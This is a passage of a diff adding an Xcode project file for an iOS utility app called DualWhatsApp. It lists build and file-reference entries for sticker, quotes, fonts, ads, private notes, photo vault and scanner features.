@@ -1,0 +1,1260 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 77;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		047FF63581074D71BD7BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = 46B5559042D04558847BBDC8; };
+		0F3A8C232E98C21700494FE8 /* Quotes.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0F3A8C222E98C21700494FE8 /* Quotes.storyboard */; };
+		0F3A8C252E98C22600494FE8 /* QuotesVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F3A8C242E98C22600494FE8 /* QuotesVC.swift */; };
+		0F3A8C272E98C51F00494FE8 /* Status.json in Resources */ = {isa = PBXBuildFile; fileRef = 0F3A8C262E98C51F00494FE8 /* Status.json */; };
+		0F3A8C2B2E98C57D00494FE8 /* QuotesTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F3A8C292E98C57D00494FE8 /* QuotesTVCell.swift */; };
+		0F3A8C2C2E98C57D00494FE8 /* QuotesTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0F3A8C2A2E98C57D00494FE8 /* QuotesTVCell.xib */; };
+		0F3A8C2E2E98CA4300494FE8 /* ViewQuotesVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F3A8C2D2E98CA4300494FE8 /* ViewQuotesVC.swift */; };
+		0F3A8C312E98CAD900494FE8 /* ViewQuoteTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F3A8C2F2E98CAD900494FE8 /* ViewQuoteTVCell.swift */; };
+		0F3A8C322E98CAD900494FE8 /* ViewQuoteTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0F3A8C302E98CAD900494FE8 /* ViewQuoteTVCell.xib */; };
+		0F3A8C342E98DB6E00494FE8 /* Helper+UIColor.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F3A8C332E98DB6B00494FE8 /* Helper+UIColor.swift */; };
+		0F77C4322E979AF300167DD8 /* WASticker.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0F77C4282E979AF300167DD8 /* WASticker.storyboard */; };
+		0F77C4352E979BB300167DD8 /* StickerPackVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C4342E979BB300167DD8 /* StickerPackVC.swift */; };
+		0F77C4372E979BF600167DD8 /* ViewStickerPackVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C4362E979BF600167DD8 /* ViewStickerPackVC.swift */; };
+		0F77C4442E979C9100167DD8 /* StickerPackTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C4432E979C9100167DD8 /* StickerPackTableViewCell.swift */; };
+		0F77C4452E979C9100167DD8 /* StickerPackTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0F77C4422E979C9100167DD8 /* StickerPackTableViewCell.xib */; };
+		0F77C4472E979CA700167DD8 /* StickerCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C4462E979CA700167DD8 /* StickerCell.swift */; };
+		0F77C6292E97ACB300167DD8 /* AquaButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C61E2E97ACB300167DD8 /* AquaButton.swift */; };
+		0F77C62A2E97ACB300167DD8 /* GradientView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C61F2E97ACB300167DD8 /* GradientView.swift */; };
+		0F77C62B2E97ACB300167DD8 /* ImageData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6202E97ACB300167DD8 /* ImageData.swift */; };
+		0F77C62C2E97ACB300167DD8 /* Interoperability.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6212E97ACB300167DD8 /* Interoperability.swift */; };
+		0F77C62D2E97ACB300167DD8 /* Limits.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6222E97ACB300167DD8 /* Limits.swift */; };
+		0F77C62E2E97ACB300167DD8 /* Sticker.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6232E97ACB300167DD8 /* Sticker.swift */; };
+		0F77C62F2E97ACB300167DD8 /* StickerPack.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6242E97ACB300167DD8 /* StickerPack.swift */; };
+		0F77C6302E97ACB300167DD8 /* StickerPackManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6252E97ACB300167DD8 /* StickerPackManager.swift */; };
+		0F77C6312E97ACB300167DD8 /* UIAlertController+Additions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6262E97ACB300167DD8 /* UIAlertController+Additions.swift */; };
+		0F77C6322E97ACB300167DD8 /* WebPManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6272E97ACB300167DD8 /* WebPManager.swift */; };
+		0F77C6912E97ACB700167DD8 /* AdManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6332E97ACB700167DD8 /* AdManager.swift */; };
+		0F77C6922E97ACB700167DD8 /* AdsConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6342E97ACB700167DD8 /* AdsConfig.swift */; };
+		0F77C6932E97ACB700167DD8 /* BannerAdsManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6352E97ACB700167DD8 /* BannerAdsManager.swift */; };
+		0F77C6942E97ACB700167DD8 /* FirebaseManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6362E97ACB700167DD8 /* FirebaseManager.swift */; };
+		0F77C6952E97ACB700167DD8 /* InterstitialAdsManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6372E97ACB700167DD8 /* InterstitialAdsManager.swift */; };
+		0F77C6962E97ACB700167DD8 /* NativeAdsManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6382E97ACB700167DD8 /* NativeAdsManager.swift */; };
+		0F77C6972E97ACB700167DD8 /* OpenAdsManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C63C2E97ACB700167DD8 /* OpenAdsManager.swift */; };
+		0F77C6982E97ACB700167DD8 /* DefaultManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C63E2E97ACB700167DD8 /* DefaultManager.swift */; };
+		0F77C6992E97ACB700167DD8 /* ReachabilityManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C63F2E97ACB700167DD8 /* ReachabilityManager.swift */; };
+		0F77C69A2E97ACB700167DD8 /* VersionCheck.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6402E97ACB700167DD8 /* VersionCheck.swift */; };
+		0F77C69B2E97ACB700167DD8 /* WebManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6412E97ACB700167DD8 /* WebManager.swift */; };
+		0F77C69C2E97ACB700167DD8 /* Helper+Common.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6432E97ACB700167DD8 /* Helper+Common.swift */; };
+		0F77C69D2E97ACB700167DD8 /* Helper+Int.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6442E97ACB700167DD8 /* Helper+Int.swift */; };
+		0F77C69E2E97ACB700167DD8 /* Helper+String.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6452E97ACB700167DD8 /* Helper+String.swift */; };
+		0F77C69F2E97ACB700167DD8 /* Helper+UIDevice.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6462E97ACB700167DD8 /* Helper+UIDevice.swift */; };
+		0F77C6A02E97ACB700167DD8 /* Helper+UIView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6472E97ACB700167DD8 /* Helper+UIView.swift */; };
+		0F77C6A12E97ACB700167DD8 /* Helper+UIViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6482E97ACB700167DD8 /* Helper+UIViewController.swift */; };
+		0F77C6A22E97ACB700167DD8 /* Fonts.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C67C2E97ACB700167DD8 /* Fonts.swift */; };
+		0F77C6A32E97ACB700167DD8 /* Images.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C67D2E97ACB700167DD8 /* Images.swift */; };
+		0F77C6A42E97ACB700167DD8 /* Storyboards.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C67E2E97ACB700167DD8 /* Storyboards.swift */; };
+		0F77C6A52E97ACB700167DD8 /* Constant.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6802E97ACB700167DD8 /* Constant.swift */; };
+		0F77C6A62E97ACB700167DD8 /* Utility.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6812E97ACB700167DD8 /* Utility.swift */; };
+		0F77C6A72E97ACB700167DD8 /* YYAnimatedImageView.m in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6842E97ACB700167DD8 /* YYAnimatedImageView.m */; };
+		0F77C6A82E97ACB700167DD8 /* YYFrameImage.m in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6862E97ACB700167DD8 /* YYFrameImage.m */; };
+		0F77C6A92E97ACB700167DD8 /* YYImage.m in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6882E97ACB700167DD8 /* YYImage.m */; };
+		0F77C6AA2E97ACB700167DD8 /* YYImageCoder.m in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C68A2E97ACB700167DD8 /* YYImageCoder.m */; };
+		0F77C6AB2E97ACB700167DD8 /* YYSpriteSheetImage.m in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C68C2E97ACB700167DD8 /* YYSpriteSheetImage.m */; };
+		0F77C6AC2E97ACB700167DD8 /* NativeAdView.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0F77C6392E97ACB700167DD8 /* NativeAdView.xib */; };
+		0F77C6AD2E97ACB700167DD8 /* NativeAdView_Medium.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0F77C63A2E97ACB700167DD8 /* NativeAdView_Medium.xib */; };
+		0F77C6AE2E97ACB700167DD8 /* NativeAdView_Small.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0F77C63B2E97ACB700167DD8 /* NativeAdView_Small.xib */; };
+		0F77C6DF2E97ACB700167DD8 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 0F77C68E2E97ACB700167DD8 /* Assets.xcassets */; };
+		0F77C6E42E97ACB900167DD8 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6E12E97ACB900167DD8 /* AppDelegate.swift */; };
+		0F77C6E52E97ACB900167DD8 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C6E22E97ACB900167DD8 /* SceneDelegate.swift */; };
+		0F77C7482E97CB8200167DD8 /* PrivateBrowser.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0F77C7472E97CB8200167DD8 /* PrivateBrowser.storyboard */; };
+		0F77C74A2E97CBE100167DD8 /* PrivateBrowserVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C7492E97CBE100167DD8 /* PrivateBrowserVC.swift */; };
+		0F77C74D2E97D66200167DD8 /* PrivateNotes.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0F77C74C2E97D66200167DD8 /* PrivateNotes.storyboard */; };
+		0F77C74F2E97DA1300167DD8 /* PrivateNotesVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C74E2E97DA1300167DD8 /* PrivateNotesVC.swift */; };
+		0F77C7572E97DF6E00167DD8 /* NoteTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C7552E97DF6E00167DD8 /* NoteTVCell.swift */; };
+		0F77C7582E97DF6E00167DD8 /* NoteTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0F77C7562E97DF6E00167DD8 /* NoteTVCell.xib */; };
+		0F77C75A2E97E45D00167DD8 /* CreateNoteVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F77C7592E97E45D00167DD8 /* CreateNoteVC.swift */; };
+		0F9AFBD72E9672EF005B871B /* DualWhatsApp.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = 0F9AFBCC2E9672EF005B871B /* DualWhatsApp.xcdatamodeld */; };
+		0F9AFBD92E9672EF005B871B /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F9AFBD32E9672EF005B871B /* ViewController.swift */; };
+		0F9AFBDC2E9672EF005B871B /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0F9AFBCF2E9672EF005B871B /* LaunchScreen.storyboard */; };
+		0F9AFBDD2E9672EF005B871B /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0F9AFBD12E9672EF005B871B /* Main.storyboard */; };
+		0F9AFBDF2E9673B9005B871B /* swiftgen.yml in Resources */ = {isa = PBXBuildFile; fileRef = 0F9AFBDE2E9673B9005B871B /* swiftgen.yml */; };
+		0F9AFD542E967F32005B871B /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 0F9AFD532E967F32005B871B /* GoogleService-Info.plist */; };
+		0FA55E7D2EAB38D1005BC557 /* StickerManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0FA55E7C2EAB38D0005BC557 /* StickerManager.swift */; };
+		0FC424BD2E9CBA58006BDF58 /* ChatBackground.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0FC424BC2E9CBA58006BDF58 /* ChatBackground.storyboard */; };
+		0FC424C12E9CC206006BDF58 /* HomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0FC424C02E9CC206006BDF58 /* HomeVC.swift */; };
+		0FC424C32E9CC210006BDF58 /* TrendingVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0FC424C22E9CC210006BDF58 /* TrendingVC.swift */; };
+		0FC424C52E9CC21B006BDF58 /* CategoryVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0FC424C42E9CC21B006BDF58 /* CategoryVC.swift */; };
+		0FC424C72E9CC262006BDF58 /* ChatBackgroundTabbarVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0FC424C62E9CC262006BDF58 /* ChatBackgroundTabbarVC.swift */; };
+		0FC424CB2E9CCB39006BDF58 /* WallpaperCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0FC424CA2E9CCB39006BDF58 /* WallpaperCVCell.xib */; };
+		0FC424CC2E9CCB39006BDF58 /* WallpaperCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0FC424C92E9CCB39006BDF58 /* WallpaperCVCell.swift */; };
+		0FC424CF2E9CD1BF006BDF58 /* WallpaperCategoryCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0FC424CE2E9CD1BF006BDF58 /* WallpaperCategoryCVCell.xib */; };
+		0FC424D02E9CD1BF006BDF58 /* WallpaperCategoryCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0FC424CD2E9CD1BF006BDF58 /* WallpaperCategoryCVCell.swift */; };
+		0FC424D22E9CD286006BDF58 /* ViewWallpaperVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0FC424D12E9CD286006BDF58 /* ViewWallpaperVC.swift */; };
+		0FC424D42E9CD44D006BDF58 /* ViewCategoryVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0FC424D32E9CD44D006BDF58 /* ViewCategoryVC.swift */; };
+		0FC424D72E9CFB7D006BDF58 /* PhotoVault.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0FC424D62E9CFB7D006BDF58 /* PhotoVault.storyboard */; };
+		0FC424D92E9CFB90006BDF58 /* PhotoVaultVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0FC424D82E9CFB90006BDF58 /* PhotoVaultVC.swift */; };
+		0FEBBEDC2E9FB6E1000A7950 /* DirectChat.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0FEBBEDB2E9FB6E1000A7950 /* DirectChat.storyboard */; };
+		0FEBBEDF2E9FB715000A7950 /* WebWhatsApp.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0FEBBEDE2E9FB715000A7950 /* WebWhatsApp.storyboard */; };
+		11083F0A2E98BC6A0051CADB /* FancyFonts.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 11083F092E98BC6A0051CADB /* FancyFonts.storyboard */; };
+		11083F0C2E98BC840051CADB /* FancyFontsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 11083F0B2E98BC840051CADB /* FancyFontsVC.swift */; };
+		11083F102E98BF380051CADB /* FancyFontsCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 11083F0F2E98BF380051CADB /* FancyFontsCell.xib */; };
+		11083F112E98BF380051CADB /* FancyFontsCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 11083F0E2E98BF380051CADB /* FancyFontsCell.swift */; };
+		11083F132E98C9C90051CADB /* Helper+UILable.swift in Sources */ = {isa = PBXBuildFile; fileRef = 11083F122E98C9C90051CADB /* Helper+UILable.swift */; };
+		11083F162E98E29D0051CADB /* SpeechToText.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 11083F152E98E29D0051CADB /* SpeechToText.storyboard */; };
+		11083F182E98E2FE0051CADB /* SpeechToTextVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 11083F172E98E2FE0051CADB /* SpeechToTextVC.swift */; };
+		11083F1A2E98E5A10051CADB /* SpeechManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 11083F192E98E5A10051CADB /* SpeechManager.swift */; };
+		111D08FA2E977F800062D4DF /* WebWhatsappVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 111D08F92E977F800062D4DF /* WebWhatsappVC.swift */; };
+		111D08FC2E9789290062D4DF /* DirectChatVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 111D08FB2E9789290062D4DF /* DirectChatVC.swift */; };
+		117F49D72E9CBF020042816B /* EmojiLetterVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 117F49D62E9CBF020042816B /* EmojiLetterVC.swift */; };
+		117F49D92E9CBF0E0042816B /* EmojiLetterVC.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 117F49D82E9CBF0E0042816B /* EmojiLetterVC.storyboard */; };
+		117F49E22E9D10880042816B /* WhatsCropping.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 117F49E12E9D10880042816B /* WhatsCropping.storyboard */; };
+		117F49E42E9D10990042816B /* WhatsCroppingVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 117F49E32E9D10990042816B /* WhatsCroppingVC.swift */; };
+		11B2EE922E97CC4600A612F9 /* RepeatText.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 11B2EE912E97CC4600A612F9 /* RepeatText.storyboard */; };
+		11B2EE942E97CC7700A612F9 /* RepeatTextVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 11B2EE932E97CC7700A612F9 /* RepeatTextVC.swift */; };
+		11D105182E9F60C9006FA033 /* CameraScanerVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 11D105162E9F60C9006FA033 /* CameraScanerVC.swift */; };
+		11D105192E9F60C9006FA033 /* CameraScan.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 11D105152E9F60C9006FA033 /* CameraScan.storyboard */; };
+		11D1051B2E9F60E9006FA033 /* CameraScannerView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 11D1051A2E9F60E9006FA033 /* CameraScannerView.swift */; };
+		11D1051D2E9F72C1006FA033 /* BarCodeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 11D1051C2E9F72C1006FA033 /* BarCodeVC.swift */; };
+		11EB16A22E9CAFAD0000E310 /* FancyTextGenerator.swift in Sources */ = {isa = PBXBuildFile; fileRef = 11EB16A12E9CAFAD0000E310 /* FancyTextGenerator.swift */; };
+		1B7A5C5C4B8DFEDC3B13A221 /* Pods_DualWhatsApp.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 406DC6EDCD18D76A68755C9C /* Pods_DualWhatsApp.framework */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXFileReference section */
+		46B5559042D04558847BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		002F21CC905860C9B9EA9CA8 /* Pods-DualWhatsApp.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DualWhatsApp.debug.xcconfig"; path = "Target Support Files/Pods-DualWhatsApp/Pods-DualWhatsApp.debug.xcconfig"; sourceTree = "<group>"; };
+		0F3A8C222E98C21700494FE8 /* Quotes.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Quotes.storyboard; sourceTree = "<group>"; };
+		0F3A8C242E98C22600494FE8 /* QuotesVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = QuotesVC.swift; sourceTree = "<group>"; };
+		0F3A8C262E98C51F00494FE8 /* Status.json */ = {isa = PBXFileReference; lastKnownFileType = text.json; path = Status.json; sourceTree = "<group>"; };
+		0F3A8C292E98C57D00494FE8 /* QuotesTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = QuotesTVCell.swift; sourceTree = "<group>"; };
+		0F3A8C2A2E98C57D00494FE8 /* QuotesTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = QuotesTVCell.xib; sourceTree = "<group>"; };
+		0F3A8C2D2E98CA4300494FE8 /* ViewQuotesVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewQuotesVC.swift; sourceTree = "<group>"; };
+		0F3A8C2F2E98CAD900494FE8 /* ViewQuoteTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewQuoteTVCell.swift; sourceTree = "<group>"; };
+		0F3A8C302E98CAD900494FE8 /* ViewQuoteTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ViewQuoteTVCell.xib; sourceTree = "<group>"; };
+		0F3A8C332E98DB6B00494FE8 /* Helper+UIColor.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Helper+UIColor.swift"; sourceTree = "<group>"; };
+		0F77C3592E97954A00167DD8 /* DualWhatsApp-Bridging-Header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "DualWhatsApp-Bridging-Header.h"; sourceTree = "<group>"; };
+		0F77C35A2E97959900167DD8 /* WebP.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = WebP.framework; path = ../../../../../Downloads/WebP.framework; sourceTree = "<group>"; };
+		0F77C4282E979AF300167DD8 /* WASticker.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = WASticker.storyboard; sourceTree = "<group>"; };
+		0F77C4342E979BB300167DD8 /* StickerPackVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StickerPackVC.swift; sourceTree = "<group>"; };
+		0F77C4362E979BF600167DD8 /* ViewStickerPackVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewStickerPackVC.swift; sourceTree = "<group>"; };
+		0F77C4422E979C9100167DD8 /* StickerPackTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = StickerPackTableViewCell.xib; sourceTree = "<group>"; };
+		0F77C4432E979C9100167DD8 /* StickerPackTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StickerPackTableViewCell.swift; sourceTree = "<group>"; };
+		0F77C4462E979CA700167DD8 /* StickerCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StickerCell.swift; sourceTree = "<group>"; };
+		0F77C61E2E97ACB300167DD8 /* AquaButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AquaButton.swift; sourceTree = "<group>"; };
+		0F77C61F2E97ACB300167DD8 /* GradientView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GradientView.swift; sourceTree = "<group>"; };
+		0F77C6202E97ACB300167DD8 /* ImageData.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ImageData.swift; sourceTree = "<group>"; };
+		0F77C6212E97ACB300167DD8 /* Interoperability.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Interoperability.swift; sourceTree = "<group>"; };
+		0F77C6222E97ACB300167DD8 /* Limits.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Limits.swift; sourceTree = "<group>"; };
+		0F77C6232E97ACB300167DD8 /* Sticker.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Sticker.swift; sourceTree = "<group>"; };
+		0F77C6242E97ACB300167DD8 /* StickerPack.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StickerPack.swift; sourceTree = "<group>"; };
+		0F77C6252E97ACB300167DD8 /* StickerPackManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StickerPackManager.swift; sourceTree = "<group>"; };
+		0F77C6262E97ACB300167DD8 /* UIAlertController+Additions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIAlertController+Additions.swift"; sourceTree = "<group>"; };
+		0F77C6272E97ACB300167DD8 /* WebPManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WebPManager.swift; sourceTree = "<group>"; };
+		0F77C6332E97ACB700167DD8 /* AdManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AdManager.swift; sourceTree = "<group>"; };
+		0F77C6342E97ACB700167DD8 /* AdsConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AdsConfig.swift; sourceTree = "<group>"; };
+		0F77C6352E97ACB700167DD8 /* BannerAdsManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BannerAdsManager.swift; sourceTree = "<group>"; };
+		0F77C6362E97ACB700167DD8 /* FirebaseManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FirebaseManager.swift; sourceTree = "<group>"; };
+		0F77C6372E97ACB700167DD8 /* InterstitialAdsManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = InterstitialAdsManager.swift; sourceTree = "<group>"; };
+		0F77C6382E97ACB700167DD8 /* NativeAdsManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NativeAdsManager.swift; sourceTree = "<group>"; };
+		0F77C6392E97ACB700167DD8 /* NativeAdView.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NativeAdView.xib; sourceTree = "<group>"; };
+		0F77C63A2E97ACB700167DD8 /* NativeAdView_Medium.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NativeAdView_Medium.xib; sourceTree = "<group>"; };
+		0F77C63B2E97ACB700167DD8 /* NativeAdView_Small.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NativeAdView_Small.xib; sourceTree = "<group>"; };
+		0F77C63C2E97ACB700167DD8 /* OpenAdsManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OpenAdsManager.swift; sourceTree = "<group>"; };
+		0F77C63E2E97ACB700167DD8 /* DefaultManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DefaultManager.swift; sourceTree = "<group>"; };
+		0F77C63F2E97ACB700167DD8 /* ReachabilityManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReachabilityManager.swift; sourceTree = "<group>"; };
+		0F77C6402E97ACB700167DD8 /* VersionCheck.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VersionCheck.swift; sourceTree = "<group>"; };
+		0F77C6412E97ACB700167DD8 /* WebManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WebManager.swift; sourceTree = "<group>"; };
+		0F77C6432E97ACB700167DD8 /* Helper+Common.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Helper+Common.swift"; sourceTree = "<group>"; };
+		0F77C6442E97ACB700167DD8 /* Helper+Int.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Helper+Int.swift"; sourceTree = "<group>"; };
+		0F77C6452E97ACB700167DD8 /* Helper+String.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Helper+String.swift"; sourceTree = "<group>"; };
+		0F77C6462E97ACB700167DD8 /* Helper+UIDevice.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Helper+UIDevice.swift"; sourceTree = "<group>"; };
+		0F77C6472E97ACB700167DD8 /* Helper+UIView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Helper+UIView.swift"; sourceTree = "<group>"; };
+		0F77C6482E97ACB700167DD8 /* Helper+UIViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Helper+UIViewController.swift"; sourceTree = "<group>"; };
+		0F77C67C2E97ACB700167DD8 /* Fonts.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Fonts.swift; sourceTree = "<group>"; };
+		0F77C67D2E97ACB700167DD8 /* Images.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Images.swift; sourceTree = "<group>"; };
+		0F77C67E2E97ACB700167DD8 /* Storyboards.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Storyboards.swift; sourceTree = "<group>"; };
